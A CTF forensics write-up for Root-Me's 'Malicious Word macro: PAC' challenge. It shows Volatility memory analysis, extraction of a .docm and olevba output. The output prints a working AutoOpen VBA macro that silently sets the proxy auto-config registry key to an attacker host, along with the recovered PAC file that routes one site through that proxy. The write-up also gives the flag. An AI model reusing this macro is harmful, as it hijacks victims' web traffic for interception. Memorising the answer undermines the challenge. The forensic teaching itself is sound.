# Malicious Word macro

## Challenge Details

- Category: Forensics
- Points: 35
- Validation: 3883
- Author: fraf
- Status: Done
# Handout
`Malicious Word macro: PAC; I opened an exciting Word file, but I think I was wrong. Since then, a website dear to me does not work very well. You have to find his favorite site. The validation password is the domain name of the website.`
https://static.root-me.org/forensic/ch20/ch20.txz
## Walkthrough
Judging by the statement, we are most probably given a memory dump, and we need to extract a word file from it which has macros enabled, then examine the associated vba script and look for domains. The macro probably played around with some proxy auto config.
Extracting:
```bash
$ tar -xvf ch20.txz
memory.dmp
```

Indeed, let's run volatility on it.

```bash
$ vol -f  memory.dmp windows.info
Volatility 3 Framework 2.28.0
Progress:  100.00               PDB scanning finished
Variable        Value

Kernel Base     0x82832000
DTB     0x185000
Symbols file:///home/hyp3rnov4/.local/lib/python3.13/site-packages/volatility3/symbols/windows/ntkrnlmp.pdb/00625D7D36754CBEBA4533BA9A0F3FE2-2.json.xz
Is64Bit False
IsPAE   False
layer_name      0 WindowsIntel
memory_layer    1 FileLayer
KdDebuggerDataBlock     0x82953c28
NTBuildLab      7601.17514.x86fre.win7sp1_rtm.10
CSDVersion      1
KdVersionBlock  0x82953c00
Major/Minor     15.7601
MachineType     332
KeNumberProcessors      1
SystemTime      2016-11-11 16:14:49+00:00
NtSystemRoot    C:\Windows
NtProductType   NtProductWinNt
NtMajorVersion  6
NtMinorVersion  1
PE MajorOperatingSystemVersion  6
PE MinorOperatingSystemVersion  1
PE Machine      332
PE TimeDateStamp        Sat Nov 20 08:42:46 2010
```

Indeed it's a windows 7 dump, let's run filescan and look for word files.

```bash
$ vol -f  memory.dmp windows.filescan > files.txt

$ rg -i doc files.txt
579:0xee1d308   \Users\fraf\Documents
673:0xee75598   \Windows\System32\shdocvw.dll
795:0xeec5988   \Users\fraf\Downloads\Very_sexy.docm
1222:0xf3ee038  \Users\fraf\Downloads\Very_sexy.docm
```

And we have a macro enabled word document! Let's dump this.

```bash
$ vol -f memory.dmp windows.dumpfiles --physaddr 0xeec5988
Volatility 3 Framework 2.28.0
Progress:  100.00               PDB scanning finished
Cache   FileObject      FileName        Result

DataSectionObject       0xeec5988       Very_sexy.docm  Error dumping file
SharedCacheMap  0xeec5988       Very_sexy.docm  file.0xeec5988.0x84f25cb0.SharedCacheMap.Very_sexy.docm.vacb
```

```bash
$ file file.*
file.0xeec5988.0x84cb24e8.DataSectionObject.Very_sexy.docm.dat: Microsoft Word 2007+
file.0xeec5988.0x84f25cb0.SharedCacheMap.Very_sexy.docm.vacb:   Microsoft Word 2007+
```
That explains the error. Vol first tries dumping from the DataSectionObject, but failed, then vol tried to recover it using windows SharedCacheMap. 
Basically, filescan gave us the kernel object with the physical offset of the windows file object for the docm we were looking for. Windows creates SectionObjectPointer which tells us where the file is in ram, which can contain: 
- DataSectionObject
- SharedCacheMap
- ImageSectionObject

DataSectionObject is how volatility tries extraction by default, it's the file data in ram, here the file wasn't recoverable from that, then volatility tried SharedCacheMap, basically the file was opened while making the dump, and it was cached in ram, so the extraction from the SharedCacheMap object is the cleaner of the two, but we should try both. A successful volatiltity extraction unfortunately doesn't always imply the full file (spoiler).

We could extract these as zip archives and reverse the vba bin files, but let's use the tool meant for vba analysis, oletools as itll be a lot faster.
Using olevba:

```bash
$ olevba file.0xeec5988.0x84f25cb0.SharedCacheMap.Very_sexy.docm.vacb
olevba 0.60.2 on Python 3.13.5 - http://decalage.info/python/oletools
ERROR    Failed to open file.0xeec5988.0x84f25cb0.SharedCacheMap.Very_sexy.docm.vacb -- probably not supported!
Traceback (most recent call last):
  File "/home/hyp3rnov4/.local/lib/python3.13/site-packages/oletools/olevba.py", line 4473, in process_file
    vba_parser = VBA_Parser_CLI(filename, data=data, container=container,
                                relaxed=options.relaxed,
                                disable_pcode=options.no_pcode)
  File "/home/hyp3rnov4/.local/lib/python3.13/site-packages/oletools/olevba.py", line 4032, in __init__
    super(VBA_Parser_CLI, self).__init__(*args, **kwargs)
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^
  File "/home/hyp3rnov4/.local/lib/python3.13/site-packages/oletools/olevba.py", line 2824, in __init__
    raise FileOpenError(msg)
oletools.olevba.FileOpenError: Failed to open file file.0xeec5988.0x84f25cb0.SharedCacheMap.Very_sexy.docm.vacb is not a supported file type, cannot extract VBA Macros.
```

So much for a clean recovery. Let's try the DataSectionObject file:

```bash
$ olevba file.0xeec5988.0x84cb24e8.DataSectionObject.Very_sexy.docm.dat
olevba 0.60.2 on Python 3.13.5 - http://decalage.info/python/oletools
===============================================================================
FILE: file.0xeec5988.0x84cb24e8.DataSectionObject.Very_sexy.docm.dat
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Sub AutoOpen()
    Dim myWS As Object
    Set myWS = CreateObject("WScript.Shell")
    myWS.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\AutoConfigURL", "http://192.168.0.19:8080/BenNon.prox", "REG_SZ"
    myWS.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\MigrateProxy", 1, "REG_DWORD"
    myWS.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyEnable", 0, "REG_DWORD"
    myWS.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\EnableAutodial", 0, "REG_DWORD"
    myWS.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\NoNetAutodial", 0, "REG_DWORD"
    Selection.TypeText Text:="Et bim !!!!"
    Selection.MoveLeft Unit:=wdWord, Count:=3, Extend:=wdExtend
    Selection.Font.Size = 72
    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|IOC       |http://192.168.0.19:|URL                                          |
|          |8080/BenNon.prox    |                                             |
|IOC       |192.168.0.19        |IPv4 address                                 |
+----------+--------------------+---------------------------------------------+
```
And there we have it! It runs immediately as the document is opened and is indeed using a proxy autoconfig by modifying the registry, `BenNon.prox`, evident by: `myWS.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\AutoConfigURL", "http://192.168.0.19:8080/BenNon.prox", "REG_SZ"` 
So now we need to get the file which our docm fetched from http://192.168.0.19:8080/BenNon.prox
It obviously isn't in the filescan, we could try grepping for it, but it's most probably also in ie cache or smth.

```bash
$ strings -a memory.dmp | rg -i -A 40 -B 10 BenNon
```

I combed through the output until I came across something very interesting, something in the format of a pac file:
```js
..
..
C:\Windows\system32\DRIVERS\monitor.sys[MonitorWMI]
-FR\mssmbios.sys.mui[MofResource]
function FindProxyForURL(url, host)
        if (shExpMatch(url,"*.ashleymadison.com/*"))
                return "PROXY 192.168.0.19:8080";
    return "DIRECT";
/BenNon.prox
..
..
```

So, as per the statement, all traffic to ashleymadison.com will be routed through the proxy 192.168.0.19:8080, and they probably have a mitm type situation, hence the change in behaviour described. But hey! We got our flag!
# FLAG
ashleymadison.com
